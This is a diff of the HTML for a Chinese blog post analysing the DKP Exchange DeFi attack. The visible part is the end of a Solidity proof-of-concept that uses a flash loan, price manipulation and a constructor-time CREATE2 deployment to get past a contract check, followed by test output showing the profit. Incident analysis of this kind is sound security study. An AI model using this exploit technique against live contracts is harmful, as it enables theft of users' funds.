 </span></span><span class="line"><span class="cl">        <span class="n">BUSD</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">calcultedAddress</span><span class="p">,</span> <span class="mi">100</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
 </span></span><span class="line"><span class="cl">        <span class="n">RunAsNotContract</span> <span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RunAsNotContract</span><span class="p">{</span><span class="n">salt</span><span class="o">:</span> <span class="n">the_salt</span><span class="p">}();</span> <span class="c1">// exploit in constructor
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">assert</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="n">calcultedAddress</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nb">assert</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="n">calcultedAddress</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">            <span class="s">&#34;DKP balance&#34;</span><span class="p">,</span>
@@ -669,7 +699,7 @@
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//还贷款
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">returnAmount</span> <span class="o">=</span> <span class="p">(</span><span class="n">flashAmount</span> <span class="o">*</span> <span class="mi">10</span><span class="n">_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">9975</span> <span class="o">+</span> <span class="mi">1000</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">returnAmount</span> <span class="o">=</span> <span class="p">(</span><span class="n">flashAmount</span> <span class="o">*</span> <span class="mi">10</span><span class="n">_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">9975</span> <span class="o">+</span> <span class="mi">1000</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">BUSD</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">Pair</span><span class="p">),</span> <span class="n">returnAmount</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
@@ -678,7 +708,7 @@
 </span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span><span class="s">&#34;BUSD balance of Pair&#34;</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">*</span> <span class="mi">9992</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10000</span><span class="p">;</span> <span class="c1">// 99.92 %
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span><span class="s">&#34;I will borrow out&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span><span class="s">&#34;I will borrow out&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
@@ -720,12 +750,11 @@
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">DKP</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">Router</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>输出:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -741,46 +770,64 @@
 </span></span><span class="line"><span class="cl">  BUSD balance of Pair: 259605.445236391899433885
 </span></span><span class="line"><span class="cl">  I will borrow out: 259397.760880202785914337
 </span></span><span class="line"><span class="cl">  DKP balance: 17666.042408805118459861
-</span></span><span class="line"><span class="cl">  BUSD balance at the end: 81512.615981085813934882
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">  BUSD balance at the end: 81512.615981085813934882</span></span></code></pre></td></tr></table></div>
 </div>
 </div></div><div class="post-footer" id="post-footer">
-    <div class="post-info">
-        <div class="post-info-line">
-            <div class="post-info-mod">
-                <span>Updated on 2023-03-24</span>
-            </div></div>
-        <div class="post-info-line">
-            <div class="post-info-md"><span>
-                            <a class="link-to-markdown" href="/dpk-exchange-attack/index.md" target="_blank">Read Markdown</a>
-                        </span></div>
-            <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析" data-hashtags="defi"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-hashtag="defi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
-            </div>
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="更新于 2023-03-24 20:16:27">更新于 2023-03-24&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/dpk-exchange-attack/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="vscode://file//Users/z/Documents/web3/05_blogs/yinhui1984.github.io/content/posts/DPK-Exchange-Attack.md" title="在编辑器中打开" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">在编辑器中打开</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://localhost:1313/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析" data-hashtags="defi"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/dpk-exchange-attack/" data-hashtag="defi"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><i class="fa-brands fa-hacker-news" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://localhost:1313/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/dpk-exchange-attack/" data-title="DKP Exchange 攻击事件分析"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </span>
         </div>
-    </div>
+      </div></div>
 
-    <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/defi/">defi</a></section>
-        <section>
-            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
-        </section>
-    </div>
-
-    <div class="post-nav"><a href="/euler-finance-attack/" class="prev" rel="prev" title="Euler Finance 黑客攻击分析"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Euler Finance 黑客攻击分析</a>
-            <a href="/analysis_of_swaposv2_attack/" class="next" rel="next" title="Swapos v2 attack 攻击分析">Swapos v2 attack 攻击分析<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/defi/" class="post-tag" title="标签 - Defi">Defi</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/euler-finance-attack/" class="post-nav-item" rel="prev" title="Euler Finance 黑客攻击分析"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>Euler Finance 黑客攻击分析</a><a href="/analysis_of_swaposv2_attack/" class="post-nav-item" rel="next" title="Swapos V2 Attack 攻击分析">Swapos V2 Attack 攻击分析<i class="fa-solid fa-angle-right" aria-hidden="true"></i></a></div>
 </div>
-</article></div>
-            </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.118.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yinhui1984" target="_blank">zhouyinhui</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
-        </div>
-    </footer></div>
+</article>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
-                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
-            </a>
-        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":2000},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#代码分析">代码分析</a>
+      <ul>
+        <li><a href="#重点代码1">重点代码1</a></li>
+        <li><a href="#重点代码2">重点代码2</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞利用">漏洞利用</a>
+      <ul>
+        <li><a href="#价格操纵">价格操纵</a></li>
+        <li><a href="#绕过合约检查">绕过合约检查</a></li>
+      </ul>
+    </li>
+    <li><a href="#poc">POC</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.5"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="目录"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/js/config/a93c2eda9fae4ab18f6b3e02a36d2f04.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
 </html>
